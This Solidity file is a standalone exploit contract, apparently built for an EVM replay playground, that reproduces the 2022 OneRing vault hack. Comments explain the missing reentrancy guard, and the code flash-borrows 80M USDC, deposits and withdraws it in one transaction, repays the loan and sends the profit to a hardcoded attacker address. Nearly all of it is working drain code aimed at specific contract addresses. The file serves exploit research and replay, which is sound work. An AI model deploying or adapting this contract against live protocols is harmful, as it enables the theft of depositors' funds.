// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-03-OneRing).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract — the
// flash-swap callback `hook` lives on the `ContractTest` itself (there is no
// standalone contract to deploy). This contract is a faithful, self-contained
// copy of that inline attack (testExploit body + the `hook` callback), so the
// playground can deploy it and record `run()`. Logic and constants are copied
// verbatim from test/OneRing_exp.sol (only the profit recipient changed from
// `tx.origin` to a hardcoded ATTACKER, mirroring the OceanDrain pattern, so the
// recorder can measure profit at a fixed address).
//
// Root cause: OneRing's `Vault.depositSafe`/`withdraw` have NO reentrancy guard
// and NO settlement-epoch boundary, so a single flash-loaned transaction can
// deposit, then withdraw in the same call — and the share price (derived from the
// vault's current holdings, which include the just-flashed deposit) credits
// slightly more than was deposited. The surplus, repeated from a flash-borrowed
// 80M USDC, nets ~1.526M USDC.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IOneRingVault {
    function depositSafe(uint256 _amount, address _token, uint256 _minAmount) external;
    function withdraw(uint256 _amount, address _underlying) external;
    function balanceOf(address account) external view returns (uint256);
}

contract OneRingDrain {
    address constant ATTACKER = 0x3Fa8cF7FeA68C8E76A9838d77889464DdFb6a6cf;
    address constant USDC = 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75;
    address constant PAIR = 0xbcab7d083Cf6a01e0DdA9ed7F8a02b47d125e682;
    address constant VAULT = 0x4e332D616b5bA1eDFd87c899E534D996c336a2FC;

    IERC20 constant usdc = IERC20(USDC);
    IUniswapV2Pair constant pair = IUniswapV2Pair(PAIR);
    IOneRingVault constant vault = IOneRingVault(VAULT);

    // step 0: flash-borrow 80M USDC from the UniswapV2 pair; the callback does the drain.
    function run() external {
        pair.swap(80_000_000 * 1e6, 0, address(this), new bytes(1));
    }

    // UniswapV2 flash-swap callback — verbatim from ContractTest.hook.
    function hook(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        usdc.approve(address(vault), type(uint256).max);
        vault.depositSafe(amount0, address(usdc), 1);
        vault.withdraw(vault.balanceOf(address(this)), address(usdc));
        usdc.transfer(msg.sender, (amount0 / 9999 * 10_000) + 10_000);
        usdc.transfer(ATTACKER, usdc.balanceOf(address(this)));
    }
}
